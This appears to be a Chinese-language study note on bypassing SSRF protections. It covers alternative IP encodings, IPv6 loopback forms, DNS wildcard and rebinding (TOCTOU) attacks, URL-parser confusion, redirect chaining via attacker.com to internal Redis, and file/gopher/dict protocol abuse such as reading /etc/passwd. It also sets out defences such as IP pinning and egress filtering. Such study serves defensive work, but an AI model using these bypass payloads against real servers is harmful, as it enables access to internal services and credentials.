|**变异类型**|**示例（访问目标 127.0.0.1）**|**解析机制 / 原理**|
|---|---|---|
|**十进制整数 (Decimal)**|`[http://2130706433/](http://2130706433/)`|计算公式为 $127 \times 256^3 + 0 \times 256^2 + 0 \times 256 + 1$|
|**十六进制 (Hex)**|`[http://0x7f.0.0.1/](http://0x7f.0.0.1/)` 或 `[http://0x7f000001/](http://0x7f000001/)`|单段或完整 Hex 编码，底层网络库自动还原|
|**八进制 (Octal)**|`[http://0177](http://0177).0.0.1/` 或 `[http://017700000001/](http://017700000001/)`|前导 `0` 会被部分解析器视为八进制|
|**省略零的简写**|`[http://127.1/](http://127.1/)` 或 `[http://127.0.1/](http://127.0.1/)`|Linux/Unix 系统解析缺省段时自动补零|
|**0.0.0.0 代替**|`[http://0.0.0.0/](http://0.0.0.0/)` 或 `[http://0/](http://0/)`|在 Linux 环境下，`0` 或 `0.0.0.0` 常直接路由至本机监听端口|




2. ==IPv6 与双栈映射绕过==

当防御规则只针对 IPv4 的内网地址（如 `10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`127.0.0.1`）设置黑名单，且服务器启用了 IPv6 协议栈时，可以通过 IPv6 格式直达回环地址：

**纯 IPv6 回环地址**：

例：
```
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
```



**IPv4-Mapped IPv6（IPv4 映射地址）**： 将 IPv4 地址嵌入 IPv6 格式中，常规正则往往无法匹配：

例：
```
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
```




3. ==DNS 层面绕过==
---

1. 域名指向与通配符解析

利用外部域名将 A 记录直接指向内网 IP，绕过针对 IP 字符串的过滤（如只检查 URL 中是否包含数字 IP）：

- **公网泛解析服务**：如 `127.0.0.1.nip.io`、`spoofed.burpcollaborator.net`。
    
- **自定义域名**：攻击者自建 DNS，直接将 `sub.attacker.com` 的 A 记录配置为 `127.0.0.1` 或 `192.168.1.1`。
    
- **本地别名**：如 `localhost`、`localhost.localdomain`（部分环境默认映射为 `127.0.0.1`）。
    


2. DNS 重绑定（DNS Rebinding - TOCTOU 攻击）

当服务端采用“**先通过域名解析 IP 并校验其安全性，校验通过后再发起真实 HTTP 请求**”的逻辑时，存在典型的“检查时间与使用时间不一致”（Time-of-Check to Time-of-Use）漏洞：

例：
![](Pasted%20image%2020260904153008.png)
- **核心配置**：将攻击者 DNS 服务器的响应 TTL 设置为 `0` 或极小值。
    
- **触发条件**：第一次请求用于过校验，第二次发起连接时本地缓存已失效，重新向 DNS 请求，此时动态切换解析结果为内网敏感地址




4. ==URL 解析器差异与语法混淆==

不同的编程语言（如 Python `urllib` vs `requests`）、Web 框架与底层 HTTP 客户端（如 `libcurl`）在遵循 RFC 3986 规范时存在解析差异：


1. `Userinfo` 认证信息混淆 (`@`)

部分弱正则仅检查 URL 是否以某个合法前缀开头，利用 `@` 符号前为认证信息的特性：

例：
```
http://allowed-domain.com@127.0.0.1/
```
- 粗糙的正则认为目标域名是 `allowed-domain.com`
    
- 符合 RFC 规范的客户端实际连接的 Host 是 `127.0.0.1`



2. 锚点与问号截断 (`#` / `?`)

例：
```
http://127.0.0.1#@allowed-domain.com
http://127.0.0.1?.allowed-domain.com
```
一些校验逻辑截取 `@` 后的字符串作为 Host，导致误判合规，但真实网络库将 `#` 之后视为 URL fragment，请求依然发给 `127.0.0.1`



3. 斜杠与反斜杠歧义

Windows 平台或特定解析器将反斜杠 `\` 视为主机分隔符，而标准 RFC 仅允许 `/`：

例：
```
http://allowed-domain.com\127.0.0.1
```




5. ==HTTP 状态码跳转（301/302/307 Redirect）==

如果服务端的 HTTP 客户端默认开启了 `follow_redirects`（自动跟踪重定向），而防 SSRF 校验**仅发生在初次发起请求的 URL 上**：

1. 向服务端提交一个合法的公网可达 URL：`[http://attacker.com/redirect.php](http://attacker.com/redirect.php)`。
    
2. 服务端校验该 URL 的域名与 IP，判定属于公网，准予发起连接。
    
3. `attacker.com` 响应 HTTP 重定向：

例：
```
HTTP/1.1 302 Found
Location: http://127.0.0.1:6379/
```
4. HTTP 客户端根据 `Location` 头部再次发起新请求，直接打穿内网，避开了初始的安全过滤

---


6. ==协议降级与多协议拓展==

当应用程序未严格限定 `http://` 或 `https://` 协议族时，可借助以下协议实施更深层次攻击：

- **`file://`**：读取本地敏感文件（如 `file:///etc/passwd`、`file:///c:/windows/win.ini`）。
    
- **`gopher://`**：支持发送包含任意换行（`\r\n`）的原始 TCP 载荷，常用于利用内网未授权的 Redis、Memcached、FastCGI 或 SMTP 构造持久化或 RCE 攻击。
    
- **`dict://`**：简单的文本协议，可用于端口扫描、获取服务指纹或向未授权服务发送简单文本命令




7. ==防御核心：纵深防御模型==

单纯依靠正则表达式或单一层面的黑名单过滤无法彻底阻断 SSRF。标准防御必须在网络传输层收紧控制：

1. **协议强制约束**：仅允许 `http` 和 `https`，显式禁用 `gopher`、`file`、`dict` 等危险协议。

2. **禁用自动跳转**：关闭客户端库的默认重定向跟踪（`follow_redirects = False`），若必须重定向，每次重定向的目标 URL 均需重复完整校验流程。

3. **连接前解析与 IP 白名单比对**：
    
    - 在应用层解析域名获取 IP。
        
    - 检查该 IP 是否属于回环（`127.0.0.0/8`、`::1`）、私有网段（RFC 1918）、链路本地（`169.254.0.0/16`）及保留网段。
        
    - **关键点**：直接对校验通过的 IP 建立 TCP Socket 连接，并在 HTTP 请求头中带上原始 Host 头，彻底避免 DNS Rebinding 造成的“二次解析”。

4. **网络层隔离**：在服务器出方向（Egress）通过防火墙（iptables/Security Group）限制访问云元数据服务（`169.254.169.254`）和内部核心管理网段





对于此类过滤，可以使用IP地址的多种写法来绕过：


例如192.168.0.1这个IP地址我们可以改写成：
8进制格式：0300.0250.0.1
16进制格式：0xC0.0xA8.0.1
10进制整数格式：3232235521
16进制整数格式：0xC0A80001
些指向127.0.0.1的地址
`http:///localhost/`
`http://0.0.0.0/
`http://[0:0:0:0:0:ffff:127.0.0.1]/`





例：
![](Pasted%20image%2020260904153407.png)









### ==利用DNS重绑定绕过相关限制进行SSRF攻击==
DNS 重绑定（DNS Rebinding）绕过 SSRF 防御的==核心本质是利用了检查时间与使用时间不一致（TOCTOU, Time-of-Check to Time-of-Use）的系统设计缺陷。==

==当应用防御逻辑试图验证用户输入的域名是否合法时，如果**验证阶段**解析出来的 IP 与**发起真实请求阶段**解析出来的 IP 属于两次独立的 DNS 解析，攻击者便可通过自建 DNS 权威服务器动态修改解析结果，使前一次返回公网合法 IP 通过检测，后一次返回内网敏感 IP 达成 SSRF==


1. ==漏洞产生的根源：TOCTOU 缺陷代码模型==

大多数脆弱的防 SSRF 代码通常表现为以下两阶段逻辑：

例：
![](Pasted%20image%2020260904153926.png)
在这个模型中，`socket.gethostbyname` 校验的是当前时刻的解析结果，而 `requests.get` 作为独立的 HTTP 客户端，在建立 TCP Socket 连接前会重新执行 DNS 查询，形成了防御校验与网络执行之间的“解耦裂隙”


2. ==攻击交互全时序解析==

例：
![](Pasted%20image%2020260904154019.png)

1. **注册自建权威 DNS**：攻击者注册域名（如 `rebind.attacker.com`），并将 NS 记录指向自建的 DNS 服务器。
    
2. **TTL 归零**：攻击者的权威 DNS 服务器在返回响应时，将记录的 **TTL（Time to Live）** 强制设置为 `0`（或 `1秒`），指示各级缓存该结果不得持久保存。
    
3. **动态状态机**：
    
    - **第 1 次查询（校验时）**：权威 DNS 返回合法的外部公网 IP（例如 `104.21.5.1`），目标应用的 `is_internal_ip()` 判定安全，放行操作。
        
    - **第 2 次查询（请求时）**：应用层客户端（如 cURL、HttpClient）发起 TCP `connect`，发现本地无 DNS 缓存，再次向 DNS 发起解析。此时权威 DNS 切换响应内容，返回受限目标（如 `127.0.0.1`、`169.254.169.254`、`192.168.1.1`）。
        
4. **内网请求触发**：HTTP 客户端直接与内网目标建立连接，成功绕过应用层黑名单

例：
![](d4185eba85a2375a538494683bc24109_720.jpg)



---

3. ==实战中的核心阻碍与绕过策略==

在真实网络环境下，纯粹的 TTL=0 策略常会遇到各种环境阻碍，攻击者通常采用以下变异手法：

1. 公共递归 DNS 的最小 TTL 钳制（Minimum TTL Clamping）

许多公共 DNS（如 `8.8.8.8`、`1.1.1.1`）或云厂商内网 Local DNS 会出于性能和抗 DDOS 考虑，**强制忽略 0 秒 TTL**，设定一个最小缓存周期（通常为 10s 至 60s）。

- **应对手段：时间差竞态（Timing Attack）** 如果目标服务端存在长耗时操作（例如先下载一个大文件、执行复杂的业务校验、或攻击者刻意引入慢速网络连接阻塞执行），只要让 Check 和 Use 之间的时间间隔超过 DNS 缓存强制失效的阈值，重绑定依然生效。



2. 双 A 记录响应（Dual A-Record Round-Robin）

若无法精准控制解析轮次，权威 DNS 可在**单次响应中同时返回两条 A 记录**：

例：
![](Pasted%20image%2020260904154113.png)
**机制**：某些语言的网络库在调用 `getaddrinfo` 时，仅取返回数组的第 1 个 IP（`104.21.5.1`）进行白名单校验；而在实际建立 HTTP 连接时，若第一次尝试握手超时或底层库具有内部负载均衡机制，可能会轮换尝试第 2 个 IP（`127.0.0.1`）



3. 语言与运行时缓存特异性

不同环境对 DNS 缓存的处理截然不同，这也是 DNS 重绑定成败的关键环境因素：

- **Java (JVM)**：
    
    - 默认策略极为严格。JVM 参数 `networkaddress.cache.ttl` 在配置了 SecurityManager 时默认为 `-1`（永久缓存）；未配置时默认缓存一般为 `30秒`。因此纯 Java 原生环境直接利用 DNS 重绑定的难度较高，除非缓存过期。
        
- **Node.js**：
    
    - Node.js 底层默认依赖 C 库的 `getaddrinfo` 异步线程池，操作系统的 DNS 缓存策略起决定性作用。在 Linux 下若未启用 `nscd` / `systemd-resolved`，进程级别并不做强制长时间缓存。
        
- **Python (`requests` / `urllib`)**：
    
    - 默认每次新建连接均调用底层系统的 `getaddrinfo`，极易受到外部 TTL=0 的穿透影响




4. ==常见利用服务与测试工具==

安全研究人员常使用以下公开服务快速验证是否存在 DNS 重绑定隐患：

|**工具 / 平台**|**运作机制**|**典型用法示例**|
|---|---|---|
|**rbndr.us**|将两个 IP 编码在子域名中，交替或随机返回结果|`7f000001.08080808.rbndr.us`（交替返回 `127.0.0.1` 与 `8.8.8.8`）|
|**Singularity of Origin**|专用于 WebRTC 及 SSRF/CSRF DNS 重绑定攻击测试的软件套件|可自定义响应策略（如：仅在第 N 次请求后切换为内网 IP）|
|**自建 Dnsmasq / CoreDNS**|编写自定义插件，根据源 IP 请求次数精确返回目标|满足精细化 TOCTOU 攻击触发|



5. ==彻底根治防御方案：IP 锁定（IP Pinning）==

试图通过“获取域名 -> 解析 IP -> 校验 IP -> 再次请求原 URL”的修补方式注定失败。**唯一在软件层面根治 DNS 重绑定的做法是：只解析一次，并在随后的网络连接中彻底锁死目标 IP。**

防御核心原则

1. **单次解析（Single Resolution）**：显式执行 DNS 查询，获取 IP 列表。
    
2. **全量 IP 审查**：确保该域名解析出的**每一个 IP** 均不在内网范围（包括 IPv4 私有地址、环回地址、链路本地地址、IPv6 对应映射）。
    
3. **锁定 IP 直连**：直接向验证合法的 IP 发起 TCP/TLS 握手，不得再让 HTTP 客户端重新查询域名。
    
4. **保留 HTTP Host / SNI**：将原始域名填入 HTTP 请求头的 `Host` 字段；若是 HTTPS，则将原始域名传入 TLS 的 SNI 扩展，防止虚拟主机路由失效和证书名称校验失败




例：
![](317e6f1127edaa2afcd171e94ad468fe_720.jpg)



![](ae6cd5f10abca143d3f54e385843c54c_720.jpg)



























































































































































































































































